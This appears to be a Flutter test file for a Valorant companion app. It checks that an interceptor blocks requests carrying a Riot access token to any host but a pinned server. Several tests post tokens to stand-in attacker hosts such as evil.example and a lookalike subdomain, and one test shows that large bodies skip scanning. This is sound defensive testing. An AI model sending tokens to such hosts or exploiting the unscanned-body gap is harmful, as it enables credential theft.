import 'dart:convert';

import 'package:dio/dio.dart';
import 'package:flutter_test/flutter_test.dart';
import 'package:valvn/core/config/app_constants.dart';
import 'package:valvn/core/network/dio_factory.dart';
import 'package:valvn/core/network/riot_exception.dart';

class _Adapter implements HttpClientAdapter {
  final requests = <RequestOptions>[];

  @override
  Future<ResponseBody> fetch(
    RequestOptions o,
    Stream<List<int>>? s,
    Future<void>? c,
  ) async {
    requests.add(o);
    return ResponseBody.fromString('{}', 200);
  }

  @override
  void close({bool force = false}) {}
}

void main() {
  late _Adapter adapter;
  late Dio dio;
  final pinned = AppConstants.communityBaseUrl;

  setUp(() {
    adapter = _Adapter();
    dio = createBaseDio()..httpClientAdapter = adapter;
  });

  Future<Response<String>> post(String url, Object? data) =>
      dio.post<String>(url, data: data);

  Future<void> expectBlocked(Future<Object?> call) => expectLater(
    call,
    throwsA(
      isA<DioException>().having(
        (e) => e.error,
        'error',
        isA<TransientException>().having(
          (t) => t.reason,
          'reason',
          'blocked_host',
        ),
      ),
    ),
  );

  test('the sign-in to the pinned host goes through', () async {
    final res = await post(
      '$pinned/v1/auth/riot',
      jsonEncode({'accessToken': 'T', 'region': 'ap'}),
    );
    expect(res.statusCode, 200);
    expect(adapter.requests, hasLength(1));
  });

  test('the same request to any other host never leaves', () async {
    await expectBlocked(
      post(
        'https://evil.example/v1/auth/riot',
        jsonEncode({'accessToken': 'T'}),
      ),
    );
    await expectBlocked(
      post('https://val.gianguyen.cloud.evil.example/v1/auth/riot', '{}'),
    );
    expect(adapter.requests, isEmpty);
  });

  test(
    'a body with an accessToken key is blocked on any path elsewhere',
    () async {
      await expectBlocked(
        post('https://evil.example/anything', {'accessToken': 'T'}),
      );
      await expectBlocked(
        post('https://evil.example/anything', '{"accessToken":"T","x":1}'),
      );
      expect(adapter.requests, isEmpty);
    },
  );

  test('ordinary traffic is untouched', () async {
    await dio.get<String>('https://valorant-api.com/v1/version');
    await post('https://pd.ap.a.pvp.net/store/v3/storefront/x', '{}');
    await post(
      'https://other.example/api',
      jsonEncode({'text': 'accessToken'}),
    );
    await post('$pinned/v1/posts', jsonEncode({'text': 'hello'}));
    expect(adapter.requests, hasLength(4));
  });

  test(
    'pinned host cannot receive secrets over HTTP or a custom port',
    () async {
      final host = Uri.parse(pinned).host;
      await expectBlocked(
        post('http://$host/v1/auth/riot', {'accessToken': 'T'}),
      );
      await expectBlocked(
        post('https://$host:8443/v1/auth/riot', {'accessToken': 'T'}),
      );
      expect(adapter.requests, isEmpty);
    },
  );

  test('a text that merely quotes the key is not mistaken for a token', () {
    final text = jsonEncode({'text': 'the "accessToken": field is secret'});
    final options = RequestOptions(path: 'https://x.example/p', data: text);
    expect(TokenEgressGuard.carriesAccessToken(options), isFalse);
    final spaced = RequestOptions(
      path: 'https://x.example/p',
      data: '{ "accessToken" : "T" }',
    );
    expect(TokenEgressGuard.carriesAccessToken(spaced), isTrue);
  });

  test('large bodies are not scanned', () {
    final options = RequestOptions(
      path: 'https://x.example/upload',
      data: '${'a' * 5000}"accessToken"',
    );
    expect(TokenEgressGuard.carriesAccessToken(options), isFalse);
  });

  test('a custom allow-list is honoured', () async {
    final custom = Dio()
      ..httpClientAdapter = adapter
      ..interceptors.add(
        TokenEgressGuard(isAllowedHost: (h) => h == 'ok.test'),
      );
    await custom.post<String>('https://ok.test/v1/auth/riot', data: '{}');
    await expectBlocked(
      custom.post<String>('https://no.test/v1/auth/riot', data: '{}'),
    );
    expect(adapter.requests, hasLength(1));
  });
}
